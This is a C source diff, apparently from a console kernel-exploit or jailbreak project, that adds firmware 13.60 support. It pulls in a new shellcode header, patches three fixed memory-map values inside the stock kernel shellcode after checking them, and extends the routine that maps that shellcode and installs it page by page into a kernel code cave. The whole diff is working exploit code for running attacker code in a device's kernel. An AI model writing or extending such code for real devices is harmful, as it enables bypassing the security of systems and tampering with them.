@@ -7,6 +7,7 @@
 #define shellcode_kernel_bin_len shellcode_kernel_port_1160_bin_len
 #else
 #include "../shellcode_kernel/shellcode_kernel.h"
+#include "shellcode_1360.h"
 #endif
 #include "../shellcode_kernel/shellcode_kernel_args.h"
 #include "../shellcode_kernel/shellcode_kernel_args_validate.h"
@@ -57,6 +58,37 @@ static int page_chain_set_rw_checked_1160(uint64_t va) {
     table_phys = PAGE_PA(entry);
   }
   return -1;
+}
+#endif
+
+#if !(STAGE2A_1160 || FW_1160_PORT)
+static int apply_1360_dma_e820_map(void *buffer, size_t length) {
+  static const struct {
+    size_t offset;
+    uint32_t expected;
+    uint32_t replacement;
+  } patches[] = {
+      {0x1889, 0x3FEFC000, 0x00F00000},
+      {0x18AC, 0x3FFFC000, 0x01000000},
+      {0x18B7, 0x00004000, 0x3F000000},
+  };
+  uint8_t *code = buffer;
+
+  for (size_t i = 0; i < sizeof(patches) / sizeof(patches[0]); i++) {
+    uint32_t value;
+    if (patches[i].offset > length ||
+        length - patches[i].offset < sizeof(value))
+      return -1;
+    memcpy(&value, code + patches[i].offset, sizeof(value));
+    if (value != patches[i].expected)
+      return -1;
+  }
+
+  for (size_t i = 0; i < sizeof(patches) / sizeof(patches[0]); i++)
+    memcpy(code + patches[i].offset, &patches[i].replacement,
+           sizeof(patches[i].replacement));
+
+  return 0;
 }
 #endif
 
@@ -244,32 +276,53 @@ int prepare_resume(void **shellcode_kernel, size_t *shellcode_kernel_len) {
   // Copy shellcode_kernel.
 #if FW_1160_PORT
   checkpoint_1160_resume("wake user mapping begin");
+  /*
+   * The dedicated 11.60 build stages only its own wake blob.  Alias the
+   * selection names to it so this path compiles exactly as in Run 15.
+   */
+#define shellcode_src shellcode_kernel_bin
+#define shellcode_len shellcode_kernel_bin_len
+#else
+  const uint8_t *shellcode_src = shellcode_kernel_bin;
+  size_t shellcode_len = shellcode_kernel_bin_len;
+  if (fw == 0x1360) {
+    shellcode_src = stock_shellcode_kernel_1360;
+    shellcode_len = stock_shellcode_kernel_1360_len;
+  }
 #endif
   *shellcode_kernel =
-      mmap(NULL, ALIGN_UP(shellcode_kernel_bin_len, PAGE_SIZE),
+      mmap(NULL, ALIGN_UP(shellcode_len, PAGE_SIZE),
            PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
   if (*shellcode_kernel == MAP_FAILED)
     return -1;
-  *shellcode_kernel_len = shellcode_kernel_bin_len;
-  memcpy(*shellcode_kernel, shellcode_kernel_bin, shellcode_kernel_bin_len);
+  *shellcode_kernel_len = shellcode_len;
+  memcpy(*shellcode_kernel, shellcode_src, shellcode_len);
 #if FW_1160_PORT
   checkpoint_1160_resume("wake user mapping populated");
+#else
+  if (fw == 0x1360 &&
+      apply_1360_dma_e820_map(*shellcode_kernel, shellcode_len)) {
+    notify("13.60 DMA E820 patch did not match stock shellcode\n");
+    return -1;
+  }
 #endif
 
   if (update_sck_args_ptr((uint64_t)*shellcode_kernel,
-                          shellcode_kernel_bin_len, args_va))
+                          shellcode_len, args_va))
     return -1;
 
   // Install shellcode_kernel in kernel space.
 #if FW_1160_PORT
   checkpoint_1160_resume("wake alias install begin");
 #endif
-  for (size_t i = 0; i < shellcode_kernel_bin_len; i += PAGE_SIZE) {
+  for (size_t i = 0; i < shellcode_len; i += PAGE_SIZE) {
     install_page_syscore(kernel_cave_shellcode + i,
                          vtophys_user((uintptr_t)*shellcode_kernel + i), 0);
   }
 #if FW_1160_PORT
   checkpoint_1160_resume("wake alias install complete");
+#undef shellcode_src
+#undef shellcode_len
 #endif
 
 #if FW_1160_PORT
